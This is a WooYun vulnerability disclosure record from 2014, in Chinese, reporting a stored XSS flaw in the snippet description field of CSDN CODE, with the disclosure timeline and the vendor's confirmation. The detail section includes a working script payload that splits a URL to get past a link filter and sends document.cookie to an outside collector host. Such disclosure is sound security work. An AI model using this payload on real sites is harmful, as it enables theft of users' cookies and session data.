{"id": 2368, "wybug_id": "wooyun-2014-065909", "wybug_title": "CSDN CODE存储型XSS一枚可能控制其他用户项目（POC代码）", "wybug_corp": "CSDN开发者社区", "wybug_author": "papaver", "wybug_date": "2014-06-23 10:42", "wybug_open_date": "2014-08-07 10:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向公众公开  简要描述： 某处的存储型xss一枚，肯定是没有检查过滤提交的内容喽 详细说明：  问题出在代码片段部分，片段简介内容处。可以随意写js进去。弹个框呗，https://code.csdn.net/snippets/398903\n\n应该是基于整个项目的安全考虑，发现代码里有http开头的地址的时候，会自动替换内容，所以，原始的js src 就行不通了，不过也许有别的办法绕过，比如分开再组合，<script>var a='http://';var b='xxxx.wicp.net/index.php';var xurl=a+b;var x=new Image(); x.src=''+xurl+'?a=info&bid=8&id=7&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})());</script>   漏洞证明：  \n\n顺利拿到内容，\n\n不过，这里的核心的cookie加了httplonly，所以，是拿不到用户的认证cookie的，但是，这并不代表就没有价值了，对吧，xss拿cookie只是最基本的攻击方式。   修复方案：  你们别的地方已经做的很好的，拿来用就可以了。   版权声明：转载请注明来源 papaver@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-06-23 12:04 厂商回复： 收到，尽快修复，多谢! 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}